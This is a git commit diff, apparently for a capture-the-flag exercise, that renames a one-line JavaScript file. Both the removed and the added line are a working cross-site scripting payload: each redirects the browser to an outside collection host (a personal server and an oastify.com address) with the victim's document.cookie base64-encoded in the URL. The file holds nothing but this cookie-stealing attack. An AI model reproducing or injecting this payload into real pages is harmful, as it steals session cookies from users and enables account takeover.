2c9bed253ddedd4ee7a964a988449b433373d011
chakal <54026816+chakal1337@users.noreply.github.com>
2022-10-26 13:17:45 -0700

    Update and rename ctfshit5.js to ctfshit6.js

--- ctfshit5.js
+++
@@ -1,1 +0,0 @@
-document.location.href = "http://server1.skidson.online:1337/?cunt="+btoa(document.cookie);
---
+++ ctfshit6.js
@@ -0,0 +1,1 @@
+document.location.href = "http://aguhkro8ygivust0pqsrdeygf7l29r.oastify.com/?cunt="+btoa(document.cookie);
